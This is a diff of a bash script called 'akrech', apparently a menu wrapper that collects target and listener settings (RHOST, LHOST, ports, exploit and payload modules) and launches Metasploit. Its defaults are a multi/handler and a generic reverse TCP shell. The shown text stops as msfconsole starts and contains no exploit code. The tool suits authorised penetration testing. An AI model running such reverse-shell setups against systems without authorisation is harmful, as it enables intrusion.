@@ -1,73 +1,109 @@
 #!/bin/bash
 
-echo -e "\e[31m[*]checking your network & network interface\e[0m" 
-echo -e "\e[31m[*]please wait or re-run akrech\e[0m"
+#color-foregground
+r='\e[31m'
+lr='\e[1;31m'
+g='\e[32m'
+lg='\e[1;32m'
+y='\e[1;33m'
+brn='\e[33m'
+b='\e[34m'
+prpl='\e[35m'
+cyan='\e[36m'
+lightgray='\e[37m'
+S='\e[0m'
+
+#text design
+bold='\e[1m'
+under_line='\e[4m'
+B='\e[5m'
+
+
+#collect local ip addresses
 eth0=`ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
-
 tun0=`ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
-
 wlan0=`ip -4 addr show wlan0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
-
-pubip=`curl ifconfig.me`
-echo -e "\e[31m[*]yap we ready to hunt!!! let's go <3\e[0m"
-sleep 2
 
 clear;
 
-echo -e "\e[41m
-▄▀█ █▄▀ █▀█ █▀▀ █▀▀ █░█
-█▀█ █░█ █▀▄ ██▄ █▄▄ █▀█\e[0m"
 echo -e "\e[40;38;5;82mgithub:- a-k-r-e-c-h
-\e[30;48;5;82mmail:- akrech@protonmail.com\e[0m"
-for i in {16..21} {21..16} ; do echo -en "\e[38;5;${i}m####\e[0m" ; done ; echo
-echo -e "\e[31m<==================\e[0m\e[1m\e[5mHAPPY-HUNTING\e[0m\e[31m===============>\e[0m"
-for i in {16..21} {21..16} ; do echo -en "\e[38;5;${i}m####\e[0m" ; done ; echo 
-
-echo -e "\e[41m[+]ENTER-exploit-MODULE[exploit]\e[5m➲ \e[0m \e[32m[default: exploit/multi/handler]
-                                \e[5m➲\e[0m  \e[32m[press 'enter' for auto selection]\e[0m"
-read -p ">" EXPLOIT 
-
-echo -e "\e[41m[+]ENTER REMOTE IP      [RHOSTS]\e[5m➲ \e[0m \e[32m[press 'enter' if RHOST not needed]\e[0m
-"
-read -p ">" RHOST
+\e[30;48;5;82mmail:- akrech@protonmail.com${S}"
+for i in {16..21} {21..16} ; do echo -en "\e[38;5;${i}m######${S}" ; done ; echo
+echo -e "\e[31m<==============================${S}\e[1m\e[5mHAPPY-HUNTING${S}\e[31m===========================>${S}"
+for i in {16..21} {21..16} ; do echo -en "\e[38;5;${i}m######${S}" ; done ; echo 
 
 
-echo -e "\e[41m[+]ENTER REMOTE PORT     [RPORT]\e[5m➲ \e[0m \e[32m[press 'enter' if RPORT not needed]\e[0m
-"
-read -p ">" RPORT
+
+echo -e ${g}" ┌─[${r}akrec${B}H${S}${g}]────────────[${b}EXPLOIT${g}]${S} ${g}[default: exploit/multi/handler]\n │ \t\t\t\t [press 'enter' for auto selection]         "
+echo -ne $okegreen" └─────► ${S}" ;        
+read EXPLOIT
 
 
-echo -e "\e[41m[+]ENTER-payload-MODULE[payload]\e[5m➲ \e[0m \e[32m[default: generic/shell_reverse_tcp]
-                                \e[5m➲\e[0m  \e[32m[press 'enter' for auto selection]\e[0m"
-read -p ">" PAYLOAD
+echo -e ${g}" ┌─[${r}${B}a${S}${r}krecH${g}]────────────[${b}RHOST${g}]${S} ${g}[press 'enter' if RHOST not needed]\n │ \t\t\t\t\t\t\t\t"
+echo -ne $g" └─────► ${S}" ;        
+read RHOST
+
+echo -e ${g}" ┌─[${r}akre${B}c${S}${r}H${g}]────────────[${b}RPORT${g}]${S} ${g}[press 'enter' if RPORT not needed]\n │\t\t\t\t\t\t\t\t"
+echo -ne $g" └─────► ${S}" ;        
+read RPORT
+
+echo -e ${g}" ┌─[${r}a${B}k${S}${r}recH${g}]────────────[${b}PAYLOAD${g}]${S} ${g}[default: generic/shell_reverse_tcp]\n │\t\t\t\t [press 'enter' for auto selection]"
+echo -ne $g" └─────► ${S}" ;        
+read PAYLOAD
 
 
-echo -e "\e[41m[+]ENTER LOCAL IP        [LHOST]\e[5m➲ \e[0m\e[32m [wlan0 -> $wlan0]
-                                   [eth0 -> $eth0]
-                                   [tun0 -> $tun0]
-                                   [public IP -> $pubip]\e[0m"
-read -p">" IP
+if [ -z $eth0 ]
+then
+echo -e ${g}" ┌─[${r}akr${B}e${S}${r}cH${g}]────────────[${b}LHOST${g}]${S} ${g}[wlan0 -> $wlan0]\n │\t\t\t       [tun0 -> $tun0]"
+echo -ne $g" └─────► ${S}" ;        
+read IP
+elif [ -z $tun0 ]
+then
+echo -e ${g}" ┌─[${r}akr${B}e${S}${r}cH${g}]────────────[${b}LHOST${g}]${S} ${g}[wlan0 -> $wlan0]\n │\t\t\t       [eth0 -> $eth0]"
+echo -ne $g" └─────► ${S}" ;        
+read IP
+else
+echo -e ${g}" ┌─[${r}akr${B}e${S}${r}cH${g}]────────────[${b}LHOST${g}]${S} ${g}[eth0 -> $eth0]\n │\t\t\t       [tun0 -> $tun0]"
+echo -ne $g" └─────► ${S}" ;        
+read IP
+fi
 
 
-echo -e "\e[41m[+]ENTER LISTENING PORT  [LPORT]\e[5m➲ \e[0m\e[32m [default: 4444]
-                                   [enter any port number]\e[0m"
-read -p ">" PORT
+echo -e ${g}" ┌─[${r}ak${B}r${S}${r}ecH${g}]────────────[${b}LPORT${g}]${S} ${g}[default: 4444]\n │\t\t\t       [press 'enter' for auto selection]"
+echo -ne $g" └─────► ${S}" ;        
+read PORT
 
 
-echo -e "\e[34m[*]Starting\e[0m \e[91mMetasploit\e[0m \e[34mwith given commands...\e[0m"
+echo -e "${b}[*]Starting${S} ${lr}Metasploit${S} ${b}with given commands...${S}"
 sleep 1
-echo -e "\e[34m[*]set LHOST as $IP\e[0m"
+if [ -z $IP ]
+then
+echo -e "${r}[!]invalid LHOST${S}"
 sleep 1
+echo -e "${b}[!]try again...${S}"
+exit
+else
+echo -e "${b}[*]set LHOST as $IP${S}"
+sleep 1
+fi
+
+
+
+
 if [ -z "$PORT" ]
 then
-    echo -e "\e[34m[*]set LPORT as 4444\e[0m" 
+    echo -e "${b}[*]set LPORT as 4444${S}" 
 else
-    echo -e "\e[34m[*]set LPORT as $PORT\e[0m"
+    echo -e "${b}[*]set LPORT as $PORT${S}"
 fi
+
+
+
+
 sleep 1
-echo -e "\e[36m[*]press (CTRL + C) or re-run akrech, if you want any change in modules...\e[0m"
+echo -e "${cyan}[*]press (CTRL + C) or re-run akrech, if you want any change in modules...${S}"
 sleep 1
-echo -e "\e[36m[!]\e[0m\e[41makrech\e[0m\e[36m is going to clear your terminal, for a clear view... \e[0m"
+echo -e "${cyan}[!]${S}\e[41makrech${S}${cyan} is going to clear your terminal, for a clear view... ${S}"
 sleep 1
 msfconsole -q -x "
 clear;
